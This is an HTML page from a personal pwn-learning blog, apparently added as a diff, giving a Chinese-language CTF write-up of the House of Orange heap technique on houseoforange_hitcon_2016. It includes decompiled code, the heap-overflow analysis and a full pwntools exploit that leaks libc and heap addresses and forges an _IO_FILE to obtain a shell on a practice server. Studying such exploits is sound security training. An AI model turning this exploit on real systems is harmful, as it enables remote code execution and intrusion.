@@ -1,0 +1,431 @@
+<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>House Of Orange | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: Bender;
+ src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+ font-family: BenderLight;
+ src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">
+</head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>House Of Orange</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-04-10T15:14:29.000Z" id="date"> 2023-04-10</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-11T15:17:22.392Z" id="updated"> 2023-09-11</time></div></span></div></div><hr><div id="post-content"><h1 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h1><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>题目中不存在 free 函数或其他释放堆块的函数。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>House of Orange 核心就是通过漏洞利用获得 free 的效果。当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><pre><code>1.篡改top chunk size（注意size需要对齐内存页）
+2.分配比top chunk size大的chunk。
+3.现在原来的top chunk进入了unsorted bin中，再次malloc就会从unsored bin中切分出需要的大小，剩余部分作新的unsorted bin。
+</code></pre>
+<h3 id="注意：伪造top-chunk-size时，必须满足以下要求"><a href="#注意：伪造top-chunk-size时，必须满足以下要求" class="headerlink" title="注意：伪造top chunk size时，必须满足以下要求"></a>注意：伪造top chunk size时，必须满足以下要求</h3><pre><code>1.伪造的size必须要对齐到内存页。
+2.size要大于MINSIZE。
+3.size要小于之后申请的chunk size + MINISIZE。
+4.size的prev inuse位必须为1。
+5.malloc的大小不能大于mmap分配阈值。
+</code></pre>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h2><p class='item-img' data-src='https://img-blog.csdnimg.cn/c9f278bf58b84b5588446c344a510595.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/c9f278bf58b84b5588446c344a510595.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>保护全开，打开ida</p>
+<h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><pre><code>void __fastcall __noreturn main(const char *a1, char **a2, char **a3)
+{
+  int choice; // eax
+
+  sub_1218();
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      menu();
+      choice = my_read(a1, a2);
+      if ( choice != 2 )
+        break;
+      show();
+    }
+    if ( choice &gt; 2 )
+    {
+      if ( choice == 3 )
+      {
+        edit();
+      }
+      else
+      {
+        if ( choice == 4 )
+        {
+          puts("give up");
+          exit(0);
+        }
+LABEL_13:
+        a1 = "Invalid choice";
+        puts("Invalid choice");
+      }
+    }
+    else
+    {
+      if ( choice != 1 )
+        goto LABEL_13;
+      add();
+    }
+  }
+}
+</code></pre>
+<h2 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h2><p>会申请三个chunk，chunk_1存放chunk_2和chunk_3的mem指针，chunk_2存放name，chunk_3存放price和color。由于num2的限制，只能使用4次add函数。</p>
+<pre><code>int add()
+{
+  unsigned int size; // [rsp+8h] [rbp-18h]
+  int color; // [rsp+Ch] [rbp-14h]
+  _QWORD *v3; // [rsp+10h] [rbp-10h]
+  _DWORD *v4; // [rsp+18h] [rbp-8h]
+
+  if ( num2 &gt; 3u )                              // num开始为0，可利用add4次
+  {
+    puts("Too many house");
+    exit(1);
+  }
+  v3 = malloc(0x10uLL);   //chunk_1
+  printf("Length of name :");
+  size = my_read();
+  if ( size &gt; 0x1000 )
+    size = 0x1000;
+  v3[1] = malloc(size);     //chunk_2
+  if ( !v3[1] )
+  {
+    puts("Malloc error !!!");
+    exit(1);
+  }
+  printf("Name :");
+  my_read2((void *)v3[1], size);
+  v4 = calloc(1uLL, 8uLL);      //chunk_3
+  printf("Price of Orange:");
+  *v4 = my_read();
+  ::color();
+  printf("Color of Orange:");
+  color = my_read();
+  if ( color != 0xDDAA &amp;&amp; (color &lt;= 0 || color &gt; 7) )
+  {
+    puts("No such color");
+    exit(1);
+  }
+  if ( color == 0xDDAA )
+    v4[1] = 0xDDAA;
+  else
+    v4[1] = color + 30;
+  *v3 = v4;
+  heap_array = v3;
+  ++num2;
+  return puts("Finish");
+}
+</code></pre>
+<h2 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h2><pre><code>int sub_EE6()
+{
+  int v0; // eax
+  int v2; // eax
+
+  if ( !heap_array )
+    return puts("No such house !");
+  if ( *(_DWORD *)(*heap_array + 4LL) == 0xDDAA )
+  {
+    printf("Name of house : %s\n", (const char *)heap_array[1]);
+    printf("Price of orange : %d\n", *(unsigned int *)*heap_array);
+    v0 = rand();
+    return printf("\x1B[01;38;5;214m%s\x1B[0m\n", *((const char **)&amp;unk_203080 + v0 % 8));
+  }
+  else
+  {
+    if ( *(int *)(*heap_array + 4LL) &lt;= 30 || *(int *)(*heap_array + 4LL) &gt; 37 )
+    {
+      puts("Color corruption!");
+      exit(1);
+    }
+    printf("Name of house : %s\n", (const char *)heap_array[1]);
+    printf("Price of orange : %d\n", *(unsigned int *)*heap_array);
+    v2 = rand();
+    return printf("\x1B[%dm%s\x1B[0m\n", *(unsigned int *)(*heap_array + 4LL), *((const char **)&amp;unk_203080 + v2 % 8));
+  }
+}
+</code></pre>
+<h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><p>存在漏洞，修改chunk时的size大小由我们自己修改，可造成堆溢出，修改下一个chunk的内容，edit函数有num作为限制，只能使用3次</p>
+<pre><code>int sub_107C()
+{
+  _DWORD *v1; // rbx
+  unsigned int size; // [rsp+8h] [rbp-18h]
+  int v3; // [rsp+Ch] [rbp-14h]
+
+  if ( num &gt; 2u )                               // num开始为0，可利用edit3次
+    return puts("You can't upgrade more");
+  if ( !heap_array )
+    return puts("No such house !");
+  printf("Length of name :");
+  size = my_read();
+  if ( size &gt; 0x1000 )
+    size = 4096;
+  printf("Name:");                              // size由我们输入，存在溢出
+  my_read2((void *)heap_array[1], size);
+  printf("Price of Orange: ");
+  v1 = (_DWORD *)*heap_array;
+  *v1 = my_read();
+  color();
+  printf("Color of Orange: ");
+  v3 = my_read();
+  if ( v3 != 0xDDAA &amp;&amp; (v3 &lt;= 0 || v3 &gt; 7) )
+  {
+    puts("No such color");
+    exit(1);
+  }
+  if ( v3 == 0xDDAA )
+    *(_DWORD *)(*heap_array + 4LL) = 0xDDAA;
+  else
+    *(_DWORD *)(*heap_array + 4LL) = v3 + 30;
+  ++num;
+  return puts("Finish");
+}
+</code></pre>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序不存在free函数，而按照我们的一般思路都是先free一个大于0x7f的chunk，进入unsortedbin，获得libc基地址，之后覆盖hook函数为system函数获得shell。而这道题不能这样做，add和edit函数的使用次数也有限制，这道题的edit函数存在堆溢出，可以考虑使用House of orange，通过修改top chunk为一个比较小的值，然后分配一个很大的chunk，使top chunk进入unsortedbin，从而泄露libc，这样heap基地址也能泄露出来，之后的话，可以使用FSOP，获得shell。</p>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>先把前面的写好</p>
+<pre><code># coding=utf-8
+from pwn import  *
+ 
+context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug
+ 
+binary = './houseoforange_hitcon_2016'  
+#sh = process(binary) #连接本地程序
+sh = remote('node4.buuoj.cn',26188) #连接远程程序
+elf = ELF(binary)     
+libc = ELF('../../libc-2.23.so--64')  
+
+#libc-2.23.so--64
+one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
+one_gadget[0] = 0x45216
+s       = lambda data               :sh.send(data)
+sa      = lambda delim,data         :sh.sendafter(delim, data)
+sl      = lambda data               :sh.sendline(data)
+sla     = lambda delim,data         :sh.sendlineafter(delim, data)
+r       = lambda num=4096           :sh.recv(num)
+ru      = lambda delims  :sh.recvuntil(delims )
+itr     = lambda                    :sh.interactive()
+uu32    = lambda data               :u32(data.ljust(4,'\0'))
+uu64    = lambda data               :u64(data.ljust(8,'\0'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+lg=lambda address,data:log.success('%s: '%(address)+hex(data))
+#定义gdb调试函数
+def dbg():
+        gdb.attach(sh)
+        pause()
+def add(size, content, price='2', color='1'):
+    ru("Your choice : ")
+    sl('1')
+    ru("Length of name :")
+    sl(str(size))
+    ru("Name :")
+    sh.send(content)
+    ru("Price of Orange:")
+    sl(str(price))
+    ru("Color of Orange:")    #1-7
+    sl(str(color))
+
+
+def show():
+    ru("Your choice : ")
+    sl('2')
+
+def edit(size, content, price='2', color='1'):
+    ru("Your choice : ")
+    sl('3')
+    ru("Length of name :")
+    sl(str(size))
+    ru("Name:")
+    sh.send(content)
+    ru("Price of Orange:")
+    sl(str(price))
+    ru("Color of Orange:")    #1-7
+    sl(str(color))
+</code></pre>
+<h3 id="修改top-chunk"><a href="#修改top-chunk" class="headerlink" title="修改top chunk"></a>修改top chunk</h3><p>随便申请一个chunk，然后利用edit函数，溢出修改topchunk</p>
+<pre><code>add(0x30,'aaaa\n')
+dbg()
+payload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(2) + p64(0) * 2 + p64(0xf81)
+edit(len(payload), payload)
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/a23256312ac74a1c922b94fb13e84135.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/a23256312ac74a1c922b94fb13e84135.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>top chunk大小为0x0000000000020f81<br>修改后的top chunk 大小为0x0000000000000f81<br class='item-img' data-src='https://img-blog.csdnimg.cn/259e73d11d5f45ad823f0a9bf7ff1f12.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/259e73d11d5f45ad823f0a9bf7ff1f12.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
+<h3 id="申请大于top-chunk的chunk，进入unsortedbin"><a href="#申请大于top-chunk的chunk，进入unsortedbin" class="headerlink" title="申请大于top chunk的chunk，进入unsortedbin"></a>申请大于top chunk的chunk，进入unsortedbin</h3><pre><code>add(0x1000, 'a\n')
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/d36f2307ea63433d8af823bfb7a100a0.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/d36f2307ea63433d8af823bfb7a100a0.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
+<h3 id="泄露libc和heap"><a href="#泄露libc和heap" class="headerlink" title="泄露libc和heap"></a>泄露libc和heap</h3><p>调试可得此时我们刚刚申请的0x400chunk里存放着0x00007fe0c1216188距离libc基地址0x3c5188（0x00007fe0c1216188-0x7fe0c0e51000），该chunk里还存放着heap地址，因为printf遇到’\x00’会停止打印，所以我们将0x00007fe0c1216188改为字符串b，再将其输出</p>
+<pre><code>add(0x400, 'a' * 8)
+show()
+ru('a'*8)
+libc.address = u64(ru('\x7f').ljust(8, '\x00')) - 0x3c5188
+lg('libc.address',libc.address)
+io_list_all = libc.symbols['_IO_list_all']
+system = libc.symbols['system']
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/b0e56ad2215f45969686d4431486c9cd.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/b0e56ad2215f45969686d4431486c9cd.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
+<p>我们泄露出的heap为0x5617117b30e0，距离heap基地址0x5617117b30e0-0x5617117b3000=0xe0，由此可获得heap_base地址</p>
+<pre><code>payload = 'b' * 0x10
+edit(0x10, payload)
+show()
+ru('b'*0x10)
+heap = u64(sh.recvuntil('\n').strip().ljust(8, '\x00'))
+heap_base = heap - 0xE0
+lg('heap_base',heap_base)
+dbg()
+</code></pre>
+<p class='item-img' data-src='https://img-blog.csdnimg.cn/2f717d520ea740d1acf13b1f48f78f98.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/2f717d520ea740d1acf13b1f48f78f98.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
+<h3 id="构造fake-file"><a href="#构造fake-file" class="headerlink" title="构造fake_file"></a>构造fake_file</h3><p>接下来我们修改当前unsortedbin中chunk的大小和内容,这里FSOP还不太明白，先借用一下大佬写的解释</p>
+<p>malloc时，对unsorted bin进行判断，此时该chunk的size为0x60，不满足要求，就把该chunk放入small bin，并且向bk-&gt;fd写入main_arena+0x58，即向_IO_list_all写入main_arena+0x58，此时判断下一个unsorted bin（_IO_list_all），而这里实际上没有chunk，此时会触发错误，此时第一个_IO_FILE_plus结构体为main_arena+0x58，而它不满足条件，就通过_chain调到下一个_IO_FILE_plus结构体，_chain位于0x68偏移的地方，main_arena+0x58+0x68=main_arena+0xc0，就是small bin中0x60大小的地方，这就回到了我们伪造的_IO_FILE_plus结构体</p>
+<pre><code>dbg()
+payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)
+fake_file = '/bin/sh\x00'+p64(0x61)#to small bin
+fake_file += p64(0)+p64(io_list_all-0x10)
+fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptr
+fake_file = fake_file.ljust(0xc0,'\x00')
+fake_file += p64(0) * 3
+fake_file += p64(heap_base+0x5E8) #vtable ptr
+fake_file += p64(0) * 2
+fake_file += p64(system)
+payload += fake_file
+edit(len(payload), payload)
+dbg()
+</code></pre>
+<p>修改前<br class='item-img' data-src='https://img-blog.csdnimg.cn/e49a2d19a419461eb89c5c1b58bf3f99.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/e49a2d19a419461eb89c5c1b58bf3f99.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>修改后<br class='item-img' data-src='https://img-blog.csdnimg.cn/c6487fe320ee4b1880bcd2c64cca274f.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/c6487fe320ee4b1880bcd2c64cca274f.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
+<p>之后我们再调用add函数，调用malloc函数，就可以产生错误信息，改变程序执行流程，获得shell</p>
+<pre><code>ru("Your choice : ")
+sl('1')
+itr()
+</code></pre>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code># coding=utf-8
+from pwn import  *
+ 
+context(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug
+ 
+binary = './houseoforange_hitcon_2016'  
+#sh = process(binary) #连接本地程序
+sh = remote('node4.buuoj.cn',26188) #连接远程程序
+elf = ELF(binary)     
+libc = ELF('../../libc-2.23.so--64')  
+
+#libc-2.23.so--64
+one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
+one_gadget[0] = 0x45216
+s       = lambda data               :sh.send(data)
+sa      = lambda delim,data         :sh.sendafter(delim, data)
+sl      = lambda data               :sh.sendline(data)
+sla     = lambda delim,data         :sh.sendlineafter(delim, data)
+r       = lambda num=4096           :sh.recv(num)
+ru      = lambda delims  :sh.recvuntil(delims )
+itr     = lambda                    :sh.interactive()
+uu32    = lambda data               :u32(data.ljust(4,'\0'))
+uu64    = lambda data               :u64(data.ljust(8,'\0'))
+leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
+lg=lambda address,data:log.success('%s: '%(address)+hex(data))
+#定义gdb调试函数
+def dbg():
+        gdb.attach(sh)
+        pause()
+def add(size, content, price='2', color='1'):
+    ru("Your choice : ")
+    sl('1')
+    ru("Length of name :")
+    sl(str(size))
+    ru("Name :")
+    sh.send(content)
+    ru("Price of Orange:")
+    sl(str(price))
+    ru("Color of Orange:")    #1-7
+    sl(str(color))
+
+
+def show():
+    ru("Your choice : ")
+    sl('2')
+
+def edit(size, content, price='2', color='1'):
+    ru("Your choice : ")
+    sl('3')
+    ru("Length of name :")
+    sl(str(size))
+    ru("Name:")
+    sh.send(content)
+    ru("Price of Orange:")
+    sl(str(price))
+    ru("Color of Orange:")    #1-7
+    sl(str(color))
+
+
+
+add(0x30,'aaaa\n')
+#dbg()
+payload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0) * 2 + p64(0xf81)
+ 
+edit(len(payload), payload)
+#dbg()
+add(0x1000, 'a\n')
+#dbg()
+add(0x400, 'a' * 8)
+#dbg()
+show()
+ru('a'*8)
+libc.address = u64(ru('\x7f').ljust(8, '\x00')) - 0x3c5188
+lg('libc.address',libc.address)
+  
+io_list_all = libc.symbols['_IO_list_all']
+system = libc.symbols['system']
+
+payload = 'b' * 0x10
+ 
+
+edit(0x10, payload)
+
+show()
+ru('b'*0x10)
+heap = u64(sh.recvuntil('\n').strip().ljust(8, '\x00'))
+heap_base = heap - 0xE0
+lg('heap_base',heap_base)
+#dbg()
+ 
+payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)
+fake_file = '/bin/sh\x00'+p64(0x61)#to small bin
+fake_file += p64(0)+p64(io_list_all-0x10)
+fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptr
+fake_file = fake_file.ljust(0xc0,'\x00')
+fake_file += p64(0) * 3
+fake_file += p64(heap_base+0x5E8) #vtable ptr
+fake_file += p64(0) * 2
+fake_file += p64(system)
+payload += fake_file
+edit(len(payload), payload)
+#dbg()
+ 
+ru("Your choice : ")
+sl('1')
+
+itr()
+</code></pre>
+<p>可能因为本地环境没配好，打不通，在buu上远程可以打通<br class='item-img' data-src='https://img-blog.csdnimg.cn/a54c5f2bc33e4c2f8519058f1e79b38d.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/a54c5f2bc33e4c2f8519058f1e79b38d.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>参考文章<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14696780.html">houseoforange_hitcon_2016</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44145820/article/details/105270036">houseoforange_hitcon_2016</a></p>
+</blockquote>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Einherjar/">← Next House of einherjar</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Storm/">House Of Storm Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">枕木</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-of-orange"><span class="toc-number">1.</span> <span class="toc-text">House of orange</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-number">1.1.</span> <span class="toc-text">前提</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%9A%E4%BC%AA%E9%80%A0top-chunk-size%E6%97%B6%EF%BC%8C%E5%BF%85%E9%A1%BB%E6%BB%A1%E8%B6%B3%E4%BB%A5%E4%B8%8B%E8%A6%81%E6%B1%82"><span class="toc-number">1.3.1.</span> <span class="toc-text">注意：伪造top chunk size时，必须满足以下要求</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#houseoforange-hitcon-2016"><span class="toc-number">2.1.</span> <span class="toc-text">houseoforange_hitcon_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">main函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#add%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.</span> <span class="toc-text">add函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#show%E5%87%BD%E6%95%B0"><span class="toc-number">2.4.</span> <span class="toc-text">show函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#edit%E5%87%BD%E6%95%B0"><span class="toc-number">2.5.</span> <span class="toc-text">edit函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.6.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">2.7.</span> <span class="toc-text">过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9top-chunk"><span class="toc-number">2.7.1.</span> <span class="toc-text">修改top chunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7%E5%A4%A7%E4%BA%8Etop-chunk%E7%9A%84chunk%EF%BC%8C%E8%BF%9B%E5%85%A5unsortedbin"><span class="toc-number">2.7.2.</span> <span class="toc-text">申请大于top chunk的chunk，进入unsortedbin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc%E5%92%8Cheap"><span class="toc-number">2.7.3.</span> <span class="toc-text">泄露libc和heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0fake-file"><span class="toc-number">2.7.4.</span> <span class="toc-text">构造fake_file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.7.5.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
